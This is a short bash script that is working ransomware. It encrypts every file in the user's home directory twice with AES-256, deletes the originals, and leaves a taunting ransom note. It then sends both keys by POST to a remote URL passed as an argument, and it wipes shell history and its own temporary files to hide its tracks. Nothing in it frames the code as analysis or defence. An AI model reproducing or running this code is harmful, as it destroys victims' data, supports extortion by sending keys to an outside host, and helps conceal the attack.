#!/bin/bash

m=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
n=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`

encfile()
{
	f=$1
	if [[ "$f" != *".aes"* ]]; then 
	openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $m
	rm $f
	fi
	p="$1.aes"
	if [[ ( "$p" == *".aes"* ) && ( "$p" != *".aes.aes"* ) ]]; then
	openssl aes-256-cbc -a -salt -in $p -out $p.aes -k $n
	rm $p
	fi
}

encdir()
{
	cd $1
	for f in * ; do
	if [ -f "$1/$f" ]; then
	encfile "$1/$f"
	elif [ -d "$1/$f" ]; then
	encdir "$1/$f"
	fi
	done
}

p=`echo ~/`
encdir "$p" > /dev/null 2>&1
echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
wget -X POST -d "dir=$p&Key1=$m&key2=$n" "$1" > /dev/null 2>&1
history -c > /dev/null 2>&1 & history -w > /dev/null 2>&1 & rm post.php & rm ~/.bash_history > /dev/null 2>&1 & rm /tmp/base.sh > /dev/null 2>&1 & rm /tmp/encrypt.sh > /dev/null 2>&1 & rm /tmp/AesKey1.txt > /dev/null 2>&1 & rm /tmp/AesKey2.txt > /dev/null 2>&1
